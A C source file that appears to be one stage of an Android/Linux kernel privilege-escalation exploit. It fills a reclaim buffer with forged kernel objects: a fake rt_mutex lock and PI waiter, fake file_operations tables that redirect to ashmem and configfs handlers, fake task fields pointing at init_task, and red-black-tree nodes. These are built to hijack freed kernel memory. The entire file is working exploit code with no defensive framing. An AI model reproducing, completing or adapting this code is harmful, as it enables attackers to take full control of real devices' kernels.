/*
 * Builds the in-memory object layout used by the reclaim stage. Writes a fake
 * lock, PI waiter, file_operations table, task fields, and red-black-tree
 * nodes into one buffer.
 */

#include <string.h>

#include "04_fake_kernel_objects.h"
#include "target.h"

_Static_assert(TARGET_PRIMARY_FOPS_BUFFER_OFF -
                       TARGET_PRIMARY_FOPS_LIVE_OFF ==
                   TARGET_LIVE_TO_BUFFER_DELTA,
               "primary FOPS D-to-A translation mismatch");
_Static_assert(TARGET_RECOVERY_FOPS_BUFFER_OFF -
                       TARGET_RECOVERY_FOPS_LIVE_OFF ==
                   TARGET_LIVE_TO_BUFFER_DELTA,
               "recovery FOPS D-to-A translation mismatch");
_Static_assert(TARGET_PRIMARY_FOPS_BUFFER_OFF +
                       TARGET_FAKE_FOPS_POPULATED_SIZE <=
                   TARGET_FAKE_LOCK_OFF,
               "primary FOPS overlaps fake lock");
_Static_assert(TARGET_FAKE_WAITER_OFF + TARGET_FAKE_WAITER_SIZE <=
                   TARGET_RECOVERY_FOPS_BUFFER_OFF,
               "recovery FOPS overlaps fake waiter");

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void put32(unsigned char *base, size_t off, uint32_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void put_fake_waiter(unsigned char *scratch, size_t w0,
                             uint64_t pi_parent, uint64_t pi_right,
                             uint64_t pi_left, uint64_t task, uint64_t lock,
                             uint32_t prio) {
  put64(scratch, w0 + TARGET_RT_WAITER_TREE_PARENT_OFF, 1);
  put64(scratch, w0 + TARGET_RT_WAITER_TREE_RIGHT_OFF, 0);
  put64(scratch, w0 + TARGET_RT_WAITER_TREE_LEFT_OFF, 0);
  put64(scratch, w0 + TARGET_RT_WAITER_PI_PARENT_OFF, pi_parent);
  put64(scratch, w0 + TARGET_RT_WAITER_PI_RIGHT_OFF, pi_right);
  put64(scratch, w0 + TARGET_RT_WAITER_PI_LEFT_OFF, pi_left);
  put64(scratch, w0 + TARGET_RT_WAITER_TASK_OFF, task);
  put64(scratch, w0 + TARGET_RT_WAITER_LOCK_OFF, lock);
  put64(scratch, w0 + TARGET_RT_WAITER_WAKE_STATE_OFF, 0);
  put32(scratch, w0 + TARGET_RT_WAITER_PRIO_OFF, prio);
  put64(scratch, w0 + TARGET_RT_WAITER_DEADLINE_OFF, 0);
  put64(scratch, w0 + TARGET_RT_WAITER_WW_CTX_OFF, 0);
}

static void put_fake_fops(unsigned char *scratch, uint64_t kernel_base,
                           uint64_t self_ref, size_t table_base) {
  uint64_t ashmem_ioctl = kernel_base + TARGET_ASHMEM_IOCTL_OFF;
  uint64_t configfs_read_iter = kernel_base + TARGET_CONFIGFS_READ_ITER_OFF;
  uint64_t copy_splice_read =
      kernel_base + TARGET_GENERIC_FILE_SPLICE_READ_OFF;

  put64(scratch, table_base + TARGET_FOPS_OWNER_OFF, 0);
  put64(scratch, table_base + TARGET_FOPS_LLSEEK_OFF, self_ref);
  put64(scratch, table_base + TARGET_FOPS_READ_OFF, 0);
  put64(scratch, table_base + TARGET_FOPS_WRITE_OFF, 0);
  put64(scratch, table_base + TARGET_FOPS_READ_ITER_OFF, configfs_read_iter);
  put64(scratch, table_base + TARGET_FOPS_WRITE_ITER_OFF,
        kernel_base + TARGET_CONFIGFS_BIN_WRITE_ITER_OFF);
  put64(scratch, table_base + TARGET_FOPS_IOCTL_OFF, ashmem_ioctl);
  put64(scratch, table_base + TARGET_FOPS_COMPAT_IOCTL_OFF,
        kernel_base + TARGET_ASHMEM_COMPAT_IOCTL_OFF);
  put64(scratch, table_base + TARGET_FOPS_MMAP_OFF,
        kernel_base + TARGET_ASHMEM_MMAP_OFF);
  put64(scratch, table_base + TARGET_FOPS_OPEN_OFF,
        kernel_base + TARGET_ASHMEM_OPEN_OFF);
  put64(scratch, table_base + TARGET_FOPS_RELEASE_OFF,
        kernel_base + TARGET_ASHMEM_RELEASE_OFF);
  put64(scratch, table_base + TARGET_FOPS_SPLICE_READ_OFF, copy_splice_read);
  put64(scratch, table_base + TARGET_FOPS_SHOW_FDINFO_OFF,
        kernel_base + TARGET_ASHMEM_SHOW_FDINFO_OFF);
}

static void put_fake_task(unsigned char *scratch, uint64_t self_ref,
                           uint64_t root_task_group, uint64_t init_task_addr) {
  put32(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_USAGE_OFF,
        TARGET_FAKE_TASK_USAGE);
  put32(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PRIO_OFF,
        TARGET_FAKE_TASK_PRIO);
  put32(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_NORMAL_PRIO_OFF,
        TARGET_FAKE_TASK_PRIO);
  put64(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PI_LOCK_OFF, 0);
  put64(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PI_WAITERS_OFF,
        self_ref);
  put64(scratch,
        TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PI_WAITERS_LEFTMOST_OFF,
        self_ref);
  put64(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_TASK_GROUP_OFF,
        root_task_group);
  put64(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PI_TOP_TASK_OFF,
        init_task_addr);
  put64(scratch, TARGET_FAKE_TASK_OFF + TARGET_FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}

void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
                                uint64_t kernel_base,
                                uint64_t ashmem_misc_fops_addr,
                                uint64_t init_task_addr) {
  memset(scratch, 0, TARGET_RECLAIM_BUFFER_SIZE);

  uint64_t lock_waiters_self_ref =
      aligned_base | TARGET_LOCK_WAITERS_SELF_LIVE_OFF;
  uint64_t pi_waiters_self_ref =
      aligned_base | TARGET_PI_WAITERS_SELF_LIVE_OFF;
  uint64_t pi_parent = aligned_base | TARGET_PRIMARY_FOPS_LIVE_OFF;
  uint64_t waiter_lock = aligned_base | TARGET_WAITER_LOCK_LIVE_OFF;
  uint64_t root_task_group = kernel_base + TARGET_ROOT_TASK_GROUP_OFF;

  put64(scratch, TARGET_FAKE_LOCK_OFF, 0);
  put64(scratch, TARGET_FAKE_LOCK_WAITERS_ROOT_OFF, lock_waiters_self_ref);
  put64(scratch, TARGET_FAKE_LOCK_WAITERS_LEFTMOST_OFF,
        lock_waiters_self_ref);
  put64(scratch, TARGET_FAKE_LOCK_OWNER_OFF, 1);

  put_fake_waiter(scratch, TARGET_FAKE_WAITER_OFF, pi_parent,
                  ashmem_misc_fops_addr, 0, init_task_addr, waiter_lock,
                  TARGET_FAKE_WAITER_PRIO);

  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref,
                TARGET_PRIMARY_FOPS_BUFFER_OFF);
  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref,
                TARGET_RECOVERY_FOPS_BUFFER_OFF);
  put_fake_task(scratch, pi_waiters_self_ref, root_task_group, init_task_addr);

  /* RIGHT_OFF / LEFT_OFF: two more fake rb_node objects, both parented
   * back at pi_parent (aligned_base|TARGET_PRIMARY_FOPS_LIVE_OFF) -- the
   * same value used above for the waiter's pi_tree_entry.parent_color. */
  put64(scratch, TARGET_FAKE_RB_RIGHT_OFF + TARGET_RB_PARENT_OFF, pi_parent);
  put64(scratch, TARGET_FAKE_RB_RIGHT_OFF + TARGET_RB_RIGHT_OFF, 0);
  put64(scratch, TARGET_FAKE_RB_RIGHT_OFF + TARGET_RB_LEFT_OFF, 0);
  put64(scratch, TARGET_FAKE_RB_LEFT_OFF + TARGET_RB_PARENT_OFF, pi_parent);
  put64(scratch, TARGET_FAKE_RB_LEFT_OFF + TARGET_RB_RIGHT_OFF, 0);
  put64(scratch, TARGET_FAKE_RB_LEFT_OFF + TARGET_RB_LEFT_OFF, 0);

}
